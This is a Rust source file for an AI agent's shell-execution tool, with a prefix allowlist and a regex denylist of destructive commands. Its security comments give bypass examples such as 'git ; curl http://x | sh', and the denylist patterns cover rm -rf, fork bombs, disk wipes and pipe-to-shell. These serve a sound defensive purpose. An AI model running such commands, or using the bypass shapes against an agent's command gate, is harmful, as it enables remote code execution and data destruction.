//! [`ShellTool`] — run a shell command and capture its stdout, stderr, and exit
//! code.
//!
//! # ⚠️ Security warning
//!
//! This tool executes arbitrary commands through the system shell (`bash -c` on
//! Unix, `cmd /C` on Windows). It is the single most dangerous capability the
//! built-in toolset ships. **Treat every [`ShellTool`] as a remote-code-execution
//! primitive whose blast radius is whatever the host process can do.**
//!
//! - [`ShellTool::with_allowlist`] narrows the tool to commands whose leading
//!   prefix is in a caller-supplied set. This *raises the bar* over
//!   [`without_allowlist`](ShellTool::without_allowlist) but is **not** a
//!   confinement boundary and is **not** by itself sufficient for untrusted
//!   input — see the prefix-gate caveat below.
//! - [`ShellTool::without_allowlist`] runs **anything**. It exists for local
//!   development only. Do not register it on a server, behind a public channel
//!   adapter, or anywhere an untrusted prompt can reach it.
//!
//! **The allowlist is a prefix gate, not a sandbox — do not rely on it to
//! confine untrusted input.** It matches the *start* of the command line and
//! does not parse shell grammar, so an allowlisted prefix can chain straight to
//! arbitrary execution: with `["git"]`, `git ; curl http://x | sh` and
//! `git$(reboot)` both begin with `git` and are admitted, and an allowed prefix
//! that invokes a shell built-in (`bash -c`, `env`, `sh`, `xargs`, …) pivots the
//! same way. The `DESTRUCTIVE_PATTERNS` denylist catches a few notorious shapes
//! but is explicitly not complete.
//!
//! Because `shell.run` deliberately runs the line through the system shell
//! (composition — pipes, redirects, substitutions — is its purpose), the
//! allowlist cannot be made a safe boundary without becoming a different tool.
//! For an untrusted prompt, **do not** treat any `shell.run` configuration as a
//! sandbox: gate it with the §11 cap-token + Cedar layers (which decide whether
//! the capability may run at all), or use the sibling `terminal.exec` tool,
//! which enforces a safe-charset allowlist and argv exec with no `/bin/sh -c`.

use std::process::Stdio;
use std::time::Duration;

use async_trait::async_trait;
use regex::Regex;
use serde::Deserialize;
use serde_json::json;
use tokio::process::Command;

use ardur_runtime::CostTuple;

use crate::capability::Capability;
use crate::error::ToolError;
use crate::tool::{Tool, ToolContext, ToolId, ToolOutput, ToolSchema};

/// Default wall-clock ceiling for a command, in seconds, when the caller does
/// not supply `timeout_secs`.
const DEFAULT_TIMEOUT_SECS: u64 = 30;

/// Best-effort patterns for known destructive shell commands. These are blocked
/// even in `Allowlist::Any` mode as a defence-in-depth measure, but they are
/// deliberately not described as a sandbox: shell syntax is too broad for a
/// regex denylist to parse completely, and callers still need a narrow
/// allowlist plus capability/Cedar enforcement for untrusted prompts.
static DESTRUCTIVE_PATTERNS: once_cell::sync::Lazy<Vec<Regex>> = once_cell::sync::Lazy::new(|| {
    vec![
        // Recursive force-remove, including `-rf`, `-fr`, `-r -f`, and `-f -r`.
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*r[[:alpha:]]*f[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*f[[:alpha:]]*r[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*r[[:alpha:]]*\b[^;&|\n]*\s-[[:alpha:]]*f[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\brm\b[^;&|\n]*\s-[[:alpha:]]*f[[:alpha:]]*\b[^;&|\n]*\s-[[:alpha:]]*r[[:alpha:]]*\b")
            .expect("valid destructive pattern regex"),
        // Pipe any producer into a shell. This catches both curl/wget pipe-to-sh
        // and less obvious producers such as `base64 -d | sh`.
        Regex::new(r"(?i)\|\s*(?:ba)?sh\b").expect("valid destructive pattern regex"),
        // Fork bomb
        Regex::new(r"(?i):\(\)\s*\{\s*:\|:&\s*\};:").expect("valid destructive pattern regex"),
        // Recursive chmod/chown on root
        Regex::new(r"(?i)\bchmod\s+.*-R\s+.*/\b").expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\bchown\s+.*-R\s+.*/\b").expect("valid destructive pattern regex"),
        // Disk wipe / filesystem creation. Permit whitespace around `=` because
        // shell users often add it while experimenting, even though some forms
        // are not accepted by `dd` itself.
        Regex::new(r"(?i)\bdd\b[^;&|\n]*\bif\s*=\s*/dev/(?:zero|random|urandom)\b")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\bdd\b[^;&|\n]*\bof\s*=\s*/dev/")
            .expect("valid destructive pattern regex"),
        Regex::new(r"(?i)\bmkfs\b").expect("valid destructive pattern regex"),
        // Shutdown/reboot
        Regex::new(r"(?i)\b(shutdown|reboot|halt|poweroff)\b")
            .expect("valid destructive pattern regex"),
    ]
});

/// The policy [`ShellTool`] gates each command against.
enum Allowlist {
    /// Permit any command. Dev-only; see the module security warning.
    Any,
    /// Permit only commands matching one of these patterns. Each pattern is one
    /// or more `|`-separated prefixes.
    Patterns(Vec<String>),
}

impl Allowlist {
    /// Whether `command` is permitted under this policy.
    ///
    /// A pattern matches when the (leading-whitespace-trimmed) command equals
    /// one of its `|`-separated alternatives, or begins with one followed by
    /// whitespace — so `git` permits `git status` but not `gitfoo`.
    fn permits(&self, command: &str) -> bool {
        match self {
            Allowlist::Any => true,
            Allowlist::Patterns(patterns) => {
                let cmd = command.trim_start();
                patterns
                    .iter()
                    .flat_map(|p| p.split('|'))
                    .map(str::trim)
                    .filter(|alt| !alt.is_empty())
                    .any(|alt| {
                        cmd == alt
                            || cmd
                                .strip_prefix(alt)
                                .is_some_and(|rest| rest.starts_with(char::is_whitespace))
                    })
            }
        }
    }
}

/// Arguments to a `shell.run` invocation.
#[derive(Deserialize)]
struct ShellArgs {
    /// The command line, run through the system shell.
    command: String,
    /// Wall-clock ceiling in seconds; the command is killed past it.
    #[serde(default = "default_timeout_secs")]
    timeout_secs: u64,
    /// Working directory; falls back to the context's `cwd` when absent.
    #[serde(default)]
    cwd: Option<String>,
}

fn default_timeout_secs() -> u64 {
    DEFAULT_TIMEOUT_SECS
}

/// A tool that runs a shell command and returns `{ stdout, stderr, exit_code,
/// timed_out }`.
///
/// See the [module security warning](self) before registering one. Construct
/// with [`ShellTool::with_allowlist`] for any non-dev context, or
/// [`ShellTool::without_allowlist`] for local development only.
pub struct ShellTool {
    schema: ToolSchema,
    allowlist: Allowlist,
    caps: Vec<Capability>,
}

impl ShellTool {
    /// The id [`ShellTool`] registers under.
    pub const ID: &'static str = "shell.run";

    /// A [`ShellTool`] confined to commands matching `commands`.
    ///
    /// Each entry is one or more `|`-separated command prefixes (e.g.
    /// `"git|cargo"` or `"ls"`). A command is permitted when it equals a prefix
    /// or begins with one followed by whitespace. A command matching nothing is
    /// refused with [`ToolError::Denied`].
    ///
    /// This is a **prefix gate, not a sandbox**: because the command still runs
    /// through the system shell, an allowlisted prefix can chain to arbitrary
    /// execution (`with_allowlist(["git"])` admits `git ; <anything>`). It is
    /// strictly better than [`without_allowlist`](Self::without_allowlist), but
    /// do not rely on it alone to confine an untrusted prompt — gate the
    /// capability with cap-token + Cedar, or prefer `terminal.exec`. See the
    /// module-level security warning.
    #[must_use]
    pub fn with_allowlist(commands: Vec<String>) -> Self {
        Self::build(Allowlist::Patterns(commands))
    }

    /// A [`ShellTool`] that permits **any** command.
    ///
    /// # ⚠️ Dev use only
    ///
    /// This is unrestricted remote code execution: it runs whatever the model
    /// asks. Never register it on a server or any surface an untrusted prompt
    /// can reach. Use [`ShellTool::with_allowlist`] in production.
    #[must_use]
    pub fn without_allowlist() -> Self {
        Self::build(Allowlist::Any)
    }

    fn build(allowlist: Allowlist) -> Self {
        let schema = ToolSchema {
            description: "Run a shell command. Returns stdout, stderr, exit code.".to_string(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string", "description": "The command line to run." },
                    "timeout_secs": {
                        "type": "integer",
                        "description": "Wall-clock ceiling in seconds (default 30).",
                        "minimum": 1
                    },
                    "cwd": {
                        "type": "string",
                        "description": "Working directory; defaults to the session cwd."
                    }
                },
                "required": ["command"]
            }),
            output_schema: json!({
                "type": "object",
                "properties": {
                    "stdout": { "type": "string" },
                    "stderr": { "type": "string" },
                    "exit_code": { "type": "integer" },
                    "timed_out": { "type": "boolean" }
                },
                "required": ["stdout", "stderr", "exit_code", "timed_out"]
            }),
            examples: vec![],
        };
        Self {
            schema,
            allowlist,
            // ShellExec is the headline grant; ProcessSpawn names the fork/exec
            // the shell performs, so both authorization layers see the full
            // surface this tool touches.
            caps: vec![Capability::ShellExec, Capability::ProcessSpawn],
        }
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn id(&self) -> ToolId {
        ToolId::new(Self::ID)
    }

    fn schema(&self) -> &ToolSchema {
        &self.schema
    }

    async fn invoke(
        &self,
        ctx: &ToolContext,
        args: serde_json::Value,
    ) -> Result<ToolOutput, ToolError> {
        let args: ShellArgs =
            serde_json::from_value(args).map_err(|e| ToolError::InvalidArgs(e.to_string()))?;

        if args.command.trim().is_empty() {
            return Err(ToolError::InvalidArgs(
                "`command` must not be empty".to_string(),
            ));
        }
        if !self.allowlist.permits(&args.command) {
            return Err(ToolError::Denied {
                reason: format!("command is not on the shell allowlist: `{}`", args.command),
            });
        }

        // Defence-in-depth: block known destructive patterns even when the
        // allowlist would otherwise permit the command. This catches footguns
        // like `rm -rf /` and `curl | sh` that an allowlist prefix alone
        // cannot prevent.
        if DESTRUCTIVE_PATTERNS
            .iter()
            .any(|re| re.is_match(&args.command))
        {
            return Err(ToolError::Denied {
                reason: format!(
                    "command matches a destructive pattern and is blocked: `{}`",
                    args.command
                ),
            });
        }

        let cwd = args.cwd.map_or_else(|| ctx.cwd.clone(), Into::into);

        // `bash -c`/`cmd /C` so the command line is interpreted as a shell would.
        #[cfg(windows)]
        let (program, flag) = ("cmd", "/C");
        #[cfg(not(windows))]
        let (program, flag) = ("bash", "-c");

        let mut cmd = Command::new(program);
        cmd.arg(flag)
            .arg(&args.command)
            .current_dir(&cwd)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // On timeout the `wait_with_output` future (which owns the child) is
            // dropped; `kill_on_drop` ensures the child is reaped rather than
            // left running.
            .kill_on_drop(true);

        let child = cmd
            .spawn()
            .map_err(|e| ToolError::ExecutionFailed(format!("failed to spawn `{program}`: {e}")))?;

        let timeout = Duration::from_secs(args.timeout_secs);
        let content = match tokio::time::timeout(timeout, child.wait_with_output()).await {
            Ok(Ok(output)) => json!({
                "stdout": String::from_utf8_lossy(&output.stdout),
                "stderr": String::from_utf8_lossy(&output.stderr),
                // A signal-terminated process has no code; report -1.
                "exit_code": output.status.code().unwrap_or(-1),
                "timed_out": false,
            }),
            Ok(Err(e)) => {
                return Err(ToolError::ExecutionFailed(format!(
                    "command i/o failed: {e}"
                )));
            }
            Err(_elapsed) => json!({
                "stdout": "",
                "stderr": "",
                "exit_code": -1,
                "timed_out": true,
            }),
        };

        Ok(ToolOutput {
            content: content.clone(),
            cost: CostTuple::default(),
            receipt_data: content,
        })
    }

    fn required_capabilities(&self) -> &[Capability] {
        &self.caps
    }
}
